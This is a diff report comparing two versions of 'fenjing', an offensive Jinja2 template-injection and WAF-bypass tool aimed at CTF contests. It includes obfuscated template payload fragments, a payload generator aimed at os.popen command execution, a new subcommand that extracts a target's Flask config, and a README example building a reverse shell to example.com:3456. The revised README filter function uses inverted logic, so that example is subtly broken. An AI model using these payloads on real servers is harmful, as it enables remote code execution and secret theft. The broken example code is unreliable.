-        payload = payload,
-        ints = [i, ],
-        var_names = [var_name, ]
+        payload=payload,
+        ints=[i, ],
+        var_names=[var_name, ]
     )
 
+
 int_vars_list = [
     IntVars(
         payload=(
             "{%set oa={}|int%}" +
             "{%set la=oa**oa%}" +
             "{%set lla=(la~la)|int%}" +
             "{%set llla=(lla~la)|int%}" +
@@ -64,16 +66,18 @@
             "llllb",
             "bb",
             "sbb",
             "ssbb",
             "zzeb"
         ]
     ),
-    int_var("{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}", 2015, "zols"),
-    int_var("{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}", 178, "ltr"),
+    int_var(
+        "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}", 2015, "zols"),
+    int_var(
+        "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}", 178, "ltr"),
     int_var("{%set lea=namespace|escape|urlencode|escape|urlencode|urlencode|urlencode|count%}", 134, "lea"),
     int_var("{%set lel=cycler|escape|urlencode|escape|urlencode|escape|urlencode|escape|urlencode|count%}", 131, "lel"),
     int_var("{%set qo=namespace|escape|urlencode|escape|urlencode|count%}", 90, "qo"),
     int_var("{%set bs=cycler|escape|urlencode|count%}", 65, "bs"),
     int_var("{%set ab=namespace|escape|count%}", 46, "ab"),
     int_var("{%set zb={}|escape|list|escape|count%}", 26, "zb"),
     int_var("{%set t=joiner|urlencode|wordcount%}", 7, "t"),
```

### Comparing `fenjing-0.2.5/fenjing/payload_gen.py` & `fenjing-0.2.6/fenjing/payload_gen.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,43 +1,20 @@
 from collections import defaultdict
 from typing import Callable, DefaultDict, List, Dict
 import re
 import time
 import logging
 from .colorize import colored
-
-
-LITERAL = "literal"
-UNSATISFIED = "unsatisfied"
-ZERO = "zero"
-POSITIVE_INTEGER = "positive_integer"
-INTEGER = "integer"
-STRING_STRING_CONCNAT = "string_string_concat"
-STRING_PERCENT = "string_percent"
-STRING_PERCENT_LOWER_C = "string_percent_lower_c"
-STRING_UNDERLINE = "string_underline"
-STRING_LOWERC = "string_lower_c"
-STRING_MANY_PERCENT_LOWER_C = "string_many_percent_lower_c"
-STRING = "string"
-FORMULAR_SUM = "formular_sum"
-ATTRIBUTE = "attribute"
-ITEM = "item"
-CLASS_ATTRIBUTE = "class_attribute"
-CHAINED_ATTRIBUTE_ITEM = "chained_attribute_item"
-EVAL_FUNC = "eval_func"
-EVAL = "eval"
-CONFIG = "config"
-MODULE_OS = "module_os"
-OS_POPEN_OBJ = "os_popen_obj"
-OS_POPEN_READ = "os_popen_read"
+from .const import *
 
 req_gens: DefaultDict[str, List[Callable]] = defaultdict(list)
 used_count = defaultdict(int)
 logger = logging.getLogger("payload_gen")
 
+
 def req_gen(f):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(
             f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
@@ -59,15 +36,16 @@
                 return
             self.cache[(gen_type, *args)] = result
         except Exception:
             return
 
     def count_success(self, gen_type, req_gen_func_name):
         used_count[req_gen_func_name] += 1
-        req_gens[gen_type].sort(key = (lambda gen_func: used_count[gen_func.__name__]), reverse=True)
+        req_gens[gen_type].sort(
+            key=(lambda gen_func: used_count[gen_func.__name__]), reverse=True)
 
     def generate_by_req_list(self, req_list):
         payload = ""
         for gen_type, *args in req_list:
             result = self.generate(gen_type, *args)
             if not result:
                 return None
@@ -108,40 +86,43 @@
             payload = self.generate_by_req_list(son_req)
             if not payload:
                 continue
             self.count_success(gen_type, req_gen_func.__name__)
             self.add_cache(gen_type, *args, result=payload)
             if gen_type in (INTEGER, STRING) and payload != str(args[0]):
                 logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
-                    great = colored("green", "Great"),
-                    gen_type = colored("yellow", gen_type, bold = True),
-                    args_repl = colored("yellow", ", ".join(repr(arg) for arg in args)),
-                    payload = colored("blue", payload)
+                    great=colored("green", "Great"),
+                    gen_type=colored("yellow", gen_type, bold=True),
+                    args_repl=colored("yellow", ", ".join(repr(arg)
+                                      for arg in args)),
+                    payload=colored("blue", payload)
                 ))
 
             elif gen_type in (EVAL_FUNC, EVAL, CONFIG, MODULE_OS, OS_POPEN_OBJ, OS_POPEN_READ):
                 logger.info("{great}, we generate {gen_type}({args_repl})".format(
-                    great = colored("green", "Great"),
-                    gen_type = colored("yellow", gen_type, bold = True),
-                    args_repl = colored("yellow", ", ".join(repr(arg) for arg in args)),
+                    great=colored("green", "Great"),
+                    gen_type=colored("yellow", gen_type, bold=True),
+                    args_repl=colored("yellow", ", ".join(repr(arg)
+                                      for arg in args)),
                 ))
             # logger.warning(f"{log.colored('green', gen_type.upper())} {args_repl} should be {log.colored('blue', payload)}")
             return payload
         logger.warning("{failed} generating {gen_type}({args_repl})".format(
-            failed = colored("red", "failed"),
-            gen_type = gen_type,
-            args_repl = ", ".join(repr(arg) for arg in args),
+            failed=colored("red", "failed"),
+            gen_type=gen_type,
+            args_repl=", ".join(repr(arg) for arg in args),
         ))
         self.add_cache(gen_type, *args, result=None)
         return None
 
     def generate(self, gen_type, *args):
         generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
         return generate_func(gen_type, *args)
 
+
 def generate(gen_type, *args, waf_func: Callable, context: dict | None = None) -> str | None:
     payload_generator = PayloadGenerator(waf_func, context)
     return payload_generator.generate(gen_type, *args)
 
 # def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None, cache: dict | None = None) -> str | None:
 
 #     if waf_func is None:
```

### Comparing `fenjing-0.2.5/fenjing/requester.py` & `fenjing-0.2.6/fenjing/requester.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,14 +1,15 @@
 import requests
 import logging
 import traceback
 import time
+from .const import DEFAULT_USER_AGENT
 
 logger = logging.getLogger("requester")
-DEFAULT_USER_AGENT = "Fenjing/0.1"
+
 
 class Requester:
     def __init__(
         self,
         interval=0.0,
         timeout=10,
         retry_times=5,
```

### Comparing `fenjing-0.2.5/fenjing/scan_url.py` & `fenjing-0.2.6/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.5/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.6/fenjing.egg-info/PKG-INFO`

 * *Files 16% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.5
+Version: 0.2.6
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -15,15 +15,15 @@
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能
 
 ## 演示
 
-![CTFShow web365](assets/demo.webp)
+![demo](assets/demo.webp)
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
@@ -147,39 +147,49 @@
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --user-agent TEXT    请求时使用的User Agent
   --help               Show this message and exit.
+
+Usage: python -m fenjing get-config [OPTIONS]
+
+  攻击指定的表单，并获得目标服务器的flask config
+
+Options:
+  -u, --url TEXT     form所在的URL
+  -a, --action TEXT  form的action，默认为当前路径
+  -m, --method TEXT  form的提交方式，默认为POST
+  -i, --inputs TEXT  form的参数，以逗号分隔
+  --interval FLOAT   每次请求的间隔
+  --user-agent TEXT  请求时使用的User Agent
+  --help             Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
-from fenjing import exec_cmd_payload
-
+from fenjing import exec_cmd_payload, config_payload
 import logging
-
 logging.basicConfig(level = logging.INFO)
 
 def waf(s: str):
     blacklist = [
-        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
+        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
         "[", '"', "'", "_", ".", "+", "~", "{{",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
         "０","１","２","３","４","５","６","７","８","９"
     ]
+    return all(word in s for word in blacklist)
 
-    for word in blacklist:
-        if word in s:
-            return False
-    return True
-
-payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+if __name__ == "__main__":
+    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+    config_payload = config_payload(waf)
 
-print(payload)
+    print(f"{shell_payload=}")
+    print(f"{config_payload=}")
 
 ```
```

### Comparing `fenjing-0.2.5/setup.py` & `fenjing-0.2.6/setup.py`

 * *Files identical despite different names*

